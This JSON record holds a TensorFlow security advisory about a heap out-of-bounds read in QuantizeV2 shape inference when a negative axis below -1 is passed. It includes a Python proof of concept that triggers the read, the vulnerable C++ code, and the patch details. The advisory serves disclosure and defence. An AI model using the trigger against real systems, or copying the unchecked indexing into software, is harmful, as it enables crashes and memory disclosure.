{"description": "### Impact\nThe [shape inference code for `QuantizeV2`](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/framework/common_shape_fns.cc#L2509-L2530) can trigger a read outside of bounds of heap allocated array:\n\n```python\nimport tensorflow as tf\n\n@tf.function\ndef test():\n  data=tf.raw_ops.QuantizeV2(\n    input=[1.0,1.0],\n    min_range=[1.0,10.0],\n    max_range=[1.0,10.0],\n    T=tf.qint32,\n    mode='MIN_COMBINED',\n    round_mode='HALF_TO_EVEN',\n    narrow_range=False,\n    axis=-100,\n    ensure_minimum_range=10)\n  return data\n\ntest()\n```\n\nThis occurs whenever `axis` is a negative value less than `-1`. In this case, we are accessing data before the start of a heap buffer:\n    \n```cc\nint axis = -1;\nStatus s = c->GetAttr(\"axis\", &axis);\nif (!s.ok() && s.code() != error::NOT_FOUND) {\n  return s;\n}   \n... \nif (axis != -1) {\n  ...\n  TF_RETURN_IF_ERROR(\n      c->Merge(c->Dim(minmax, 0), c->Dim(input, axis), &depth));\n}\n```\n\nThe code allows `axis` to be an optional argument (`s` would contain an `error::NOT_FOUND` error code). Otherwise, it assumes that `axis` is a valid index into the dimensions of the `input` tensor. If `axis` is less than `-1` then this results in a heap OOB read.\n    \n### Patches\nWe have patched the issue in GitHub commit [a0d64445116c43cf46a5666bd4eee28e7a82f244](https://github.com/tensorflow/tensorflow/commit/a0d64445116c43cf46a5666bd4eee28e7a82f244).\n    \nThe fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, as this version is the only one that is also affected.\n  \n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.", "methods": ["Heap OOB read in shape inference for `QuantizeV2` due to negative `axis` value."]}
